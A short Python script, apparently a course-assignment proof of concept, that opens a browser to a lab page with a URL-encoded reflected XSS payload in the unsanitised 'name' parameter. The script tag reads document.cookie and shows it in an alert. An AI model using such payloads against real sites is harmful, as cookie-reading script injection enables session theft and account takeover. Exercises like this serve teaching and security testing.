import webbrowser

# Exploit: include script in the 'name' - the value of 'name' is not santised
# name = <script>alert(document.cookie)</script>
# Reflected XSS (without XSS-auditor)

def main():
    webbrowser.open('http://www.wsb.com/Assignment2/case02.php?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E', 2)

if __name__ == "__main__":
    main()
